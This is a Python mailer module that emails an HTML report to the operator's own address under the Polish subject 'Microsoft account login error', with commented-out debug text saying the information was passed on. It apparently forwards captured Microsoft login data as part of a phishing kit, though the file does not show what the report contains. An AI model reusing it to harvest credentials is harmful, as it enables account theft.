import smtplib,requests
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from Kernel.Settings import Settings
from colorama import Fore, Back, Style
from colorama import init
class Mail:
    def __init__(self,INFO, EMAIL):
        self.INFO = INFO
        self.CUSTOMER_MAIL = EMAIL
    
    def MIME(self):
        msg = MIMEMultipart()
        msg ['From'] = Settings.AdminMail
        msg ['To'] = Settings.AdminMail
        msg ['Subject'] = 'BLAD LOGOWANIA DO KONTA MICROSOFT'
        msg.attach(MIMEText(self.INFO,'html'))
        return msg.as_string()
    
    def Send(self):
        _server = smtplib.SMTP(Settings.SMTP_host, Settings.SMTP_port)
        _server.starttls()
        _server.login(Settings.AdminMail, Settings.AdminPw)
        _server.sendmail(Settings.AdminMail, Settings.AdminMail, self.MIME())
        #print(self.MIME())
        #Settings().Debug(1, Fore.RED + self.INFO)
        #Settings().Debug(1,Fore.CYAN + "INFORMACJA ZOSTALA PRZEKAZANA")

   